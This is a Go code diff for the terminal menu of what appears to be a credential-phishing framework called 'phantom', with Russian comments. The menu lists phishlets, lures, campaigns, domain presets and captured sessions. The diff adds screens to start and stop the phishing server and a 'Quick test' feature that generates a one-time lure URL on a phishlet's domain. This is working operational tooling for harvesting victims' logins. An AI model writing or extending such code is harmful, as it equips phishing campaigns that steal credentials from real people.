@@ -9,8 +9,10 @@ import (
 
 	"github.com/charmbracelet/bubbles/list"
 	"github.com/charmbracelet/bubbles/textinput"
+	"time"
 	tea "github.com/charmbracelet/bubbletea"
 	"github.com/charmbracelet/lipgloss"
+	"github.com/phantom-v2/phantom/internal/supervise"
 )
 
 var (
@@ -49,6 +51,8 @@ const (
 	sCampNew
 	sCamps
 	sCaptures
+	sServer
+	sQuickPick
 	sResult
 )
 
@@ -74,7 +78,8 @@ type model struct {
 	pickList list.Model
 	pickKind string
 	pickPhishlet string
-	pickEnabled bool // "node=..." или текст ошибки
+	pickEnabled bool
+	loc         Local // "node=..." или текст ошибки
 	list   list.Model
 	inputs []textinput.Model
 	labels []string
@@ -98,6 +103,8 @@ func initialModel(c *Client) model {
 		item{"Campaign+", "новая: цели -> launch -> send", sCampNew},
 		item{"Domains", "пресеты доменов", sDomains},
 		item{"Captures", "последние захваты", sCaptures},
+		item{"Server", "старт/стоп/логи (одно окно)", sServer},
+		item{"Quick test", "приманка одной кнопкой", sQuickPick},
 		item{"Quit", "выход (сервер продолжает работать)", sMenu},
 	}
 	delegate := list.NewDefaultDelegate()
@@ -113,9 +120,19 @@ func initialModel(c *Client) model {
 	return model{client: c, screen: sConnect, list: l}
 }
 
+// Local — локальный контекст меню (супервизор, пути).
+type Local struct {
+	Exe      string // путь к бинарю phantom (os.Executable)
+	Config   string // путь к config.yaml
+	PhishDir string // директория фишлетов
+	API      string // api addr для health
+}
+
 // Run запускает TUI. Возвращает управление после Quit.
-func Run(c *Client) error {
-	p := tea.NewProgram(initialModel(c))
+func Run(c *Client, loc Local) error {
+	m := initialModel(c)
+	m.loc = loc
+	p := tea.NewProgram(m)
 	_, err := p.Run()
 	return err
 }
@@ -209,6 +226,33 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		}
 		m.pickList, cmd = m.pickList.Update(msg)
 		return m, cmd
+	}
+	if m.screen == sServer {
+		if km, ok := msg.(tea.KeyMsg); ok {
+			switch km.String() {
+			case "s":
+				pid, err := supervise.Start(m.loc.Exe, []string{"-config", m.loc.Config, "-phishlets", m.loc.PhishDir, "-api", m.loc.API})
+				if err != nil {
+					return m.showResult("start: " + err.Error(), true), nil
+				}
+				return m.showResult(fmt.Sprintf("запущен pid=%d, жди 3с и жми r", pid), false), nil
+			case "x":
+				if err := supervise.Stop(); err != nil {
+					return m.showResult("stop: " + err.Error(), true), nil
+				}
+				return m.showResult("остановлен", false), nil
+			case "l":
+				return m.showResult(supervise.Tail(20), false), nil
+			case "r":
+				st, pid := supervise.Status(m.loc.API)
+				m.result = "сервер: " + st
+				if pid > 0 {
+					m.result += fmt.Sprintf(" pid=%d", pid)
+				}
+				return m, nil
+			}
+		}
+		return m, nil
 	}
 	if m.screen == sPhishDetail {
 		if km, ok := msg.(tea.KeyMsg); ok {
@@ -377,6 +421,13 @@ func (m model) reloadPick() (tea.Model, tea.Cmd) {
 			return m.showResult("domains: " + err.Error(), true), nil
 		}
 		return m.openPick("пресеты доменов  (a-добавить x-удалить)", "domains", doms), nil
+	case "quicktest":
+		items, _, err := m.phishNames()
+		if err != nil {
+			return m.showResult("phishlets: " + err.Error(), true), nil
+		}
+		return m.openPick("фишлет для быстрого теста", "quicktest", items), nil
+
 	case "camp":
 		list, err := m.client.ListCampaigns()
 		if err != nil {
@@ -389,6 +440,28 @@ func (m model) reloadPick() (tea.Model, tea.Cmd) {
 		return m.openPick("кампании", "camp", items), nil
 	}
 	return m, nil
+}
+
+// quickCreate делает one-time приманку и показывает URL.
+func (m model) quickCreate(id string) (tea.Model, tea.Cmd) {
+	det, err := m.client.PhishletsDetail()
+	if err != nil {
+		return m.showResult("detail: " + err.Error(), true), nil
+	}
+	domain := ""
+	for _, p := range det {
+		if p.ID == id && len(p.Domains) > 0 {
+			domain = p.Domains[0]
+		}
+	}
+	if domain == "" {
+		return m.showResult("нет домена у " + id, true), nil
+	}
+	path := "/l/qt-" + randSuffix()
+	if err := m.client.SmartLure(path, id, 60, 1, "", false); err != nil {
+		return m.showResult("lure: " + err.Error(), true), nil
+	}
+	return m.showResult("открой в браузере:\nhttps://" + domain + ":8443" + path + "\n(в проде без :8443)", false), nil
 }
 
 // pickEnter — выбор в пикере по kind.
@@ -449,6 +522,8 @@ func (m model) pickEnter() (tea.Model, tea.Cmd) {
 			return m.showResult("domain: " + err.Error(), true), nil
 		}
 		return m.showResult(m.pickPhishlet+" → "+sel.title, false), nil
+	case "quicktest":
+		return m.quickCreate(phishID(sel.title))
 	case "camp":
 		id := strings.Fields(sel.title)[0]
 		list, err := m.client.ListCampaigns()
@@ -558,6 +633,20 @@ func (m model) onEnter() (tea.Model, tea.Cmd) {
 				return m.showResult("phishlets: " + err.Error(), true), nil
 			}
 			return m.openPick("phishlet -> on/off", "phish-toggle", items), nil
+		case sServer:
+			st, pid := supervise.Status(m.loc.API)
+			m.result = "сервер: " + st
+			if pid > 0 {
+				m.result += fmt.Sprintf(" pid=%d", pid)
+			}
+			m.screen = sServer
+			return m, nil
+		case sQuickPick:
+			items, _, err := m.phishNames()
+			if err != nil {
+				return m.showResult("phishlets: " + err.Error(), true), nil
+			}
+			return m.openPick("фишлет для быстрого теста", "quicktest", items), nil
 		case sCaptures:
 			caps, err := m.client.Captures()
 			if err != nil {
@@ -696,6 +785,17 @@ func (m model) showResult(s string, isErr bool) model {
 	return m
 }
 
+func randSuffix() string {
+	const abc = "abcdefghijklmnopqrstuvwxyz0123456789"
+	var b strings.Builder
+	seed := time.Now().UnixNano()
+	for i := 0; i < 6; i++ {
+		seed = seed*6364136223846793005 + 1442695040888963407
+		b.WriteByte(abc[uint64(seed>>33)%uint64(len(abc))])
+	}
+	return b.String()
+}
+
 func short(s string) string {
 	if len(s) > 8 {
 		return s[:8]
@@ -762,6 +862,9 @@ func (m model) where() string {
 		return "меню › пресеты"
 	case sPick:
 		return "меню › выбор: " + m.pickTitle
+	case sServer:
+		return m.header() + boxStyle.Render(m.result) +
+			footStyle.Render("\ns — старт · x — стоп · l — лог · r — статус · esc — назад")
 	case sPhishDetail:
 		return "фишлеты › " + m.pickPhishlet
 	case sDomainAdd:
